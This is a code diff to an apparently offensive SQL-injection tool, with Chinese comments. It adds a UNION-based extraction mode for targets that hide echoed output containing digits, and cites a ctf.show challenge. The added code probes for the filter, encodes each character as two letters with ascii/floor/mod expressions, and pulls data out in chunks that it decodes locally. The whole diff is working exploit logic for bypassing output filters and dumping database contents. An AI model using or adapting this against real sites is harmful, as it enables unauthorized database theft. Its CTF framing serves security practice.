@@ -62,6 +62,7 @@ class BaseOracle:
 # ---------------------------------------------------------------------------
 class UnionOracle(BaseOracle):
     name = "union"
+    ENCODE_CHUNK = 20   # 输出过滤模式下每请求编码的字符数（控制 URL 长度）
 
     def __init__(self, *a, **kw):
         super().__init__(*a, **kw)
@@ -69,8 +70,24 @@ class UnionOracle(BaseOracle):
             raise OracleError("缺少回显位/列数信息，UNION 通道不可用")
         if self.waf.is_filtered("concat", "union", "select"):
             raise OracleError("union/select/concat 被过滤")
+        self.output_filtered = False   # 输出侧过滤：含数字的回显行被目标吞掉
 
     def scalar(self, expr: str) -> str:
+        if self.output_filtered:
+            return self._scalar_encoded(expr)
+        try:
+            return self._scalar_raw(expr)
+        except OracleError as e:
+            if "回显标记未找到" not in str(e):
+                raise
+            if self._probe_output_filter():
+                self.output_filtered = True
+                self.s.log("INFO", "[union] 检出输出侧过滤（含数字的回显行被吞）"
+                                   "→ 切换字母编码取数")
+                return self._scalar_encoded(expr)
+            raise
+
+    def _scalar_raw(self, expr: str) -> str:
         n = self.inj.column_count
         pos = self.inj.echo_positions[0] - 1
         cols = ["null"] * n
@@ -86,6 +103,54 @@ class UnionOracle(BaseOracle):
             raise OracleError(f"回显标记未找到（可能列数/回显位变化）: {expr}")
         val = m.group(1)
         return "" if val == "NULL" else val
+
+    # ---- 输出侧过滤环境（ctf.show web174 类：回显含数字的行被吞） ----------
+    def _probe_output_filter(self) -> bool:
+        """区分「输出侧过滤」与列数/回显位漂移：纯字母值能回显、数字值不能。"""
+        try:
+            ok_letters = self._scalar_raw("0x616263") == "abc"   # 'abc'
+        except OracleError:
+            return False
+        try:
+            self._scalar_raw("0x313233")                          # '123'
+            ok_digits = True
+        except OracleError:
+            ok_digits = False
+        return ok_letters and not ok_digits
+
+    @staticmethod
+    def _enc_pairs(char_expr: str) -> str:
+        """单字符 → 两个纯字母（char(97+高位), char(97+低位)），a-q 各 16 态。"""
+        a = f"ascii({char_expr})"
+        return f"char(97+floor({a}/16)),char(97+mod({a},16))"
+
+    @staticmethod
+    def _enc_len_expr(expr: str) -> str:
+        """长度 → 3 个纯字母（最大 4095）。"""
+        L = f"length(({expr}))"
+        return ("concat(char(97+floor(" + L + "/256)),"
+                "char(97+mod(floor(" + L + "/16),16)),"
+                "char(97+mod(" + L + ",16)))")
+
+    def _scalar_encoded(self, expr: str) -> str:
+        # 1) 编码读长度（3 字母）；2) 分块把每个字符编码为两个字母取回；3) 本地解码
+        enc_len = self._scalar_raw(self._enc_len_expr(expr))
+        if len(enc_len) < 3:
+            return ""
+        total = ((ord(enc_len[0]) - 97) * 256 + (ord(enc_len[1]) - 97) * 16
+                 + (ord(enc_len[2]) - 97))
+        out = []
+        for start in range(1, total + 1, self.ENCODE_CHUNK):
+            end = min(start + self.ENCODE_CHUNK - 1, total)
+            parts = ",".join(self._enc_pairs(f"substr(({expr}),{i},1)")
+                             for i in range(start, end + 1))
+            chunk = self._scalar_raw(f"concat({parts})")
+            if len(chunk) < (end - start + 1) * 2:
+                raise OracleError(f"编码取数不完整（限流?）: pos {start}-{end}")
+            out.append("".join(
+                chr((ord(chunk[j]) - 97) * 16 + (ord(chunk[j + 1]) - 97))
+                for j in range(0, len(chunk), 2)))
+        return "".join(out)
 
 
 # ---------------------------------------------------------------------------
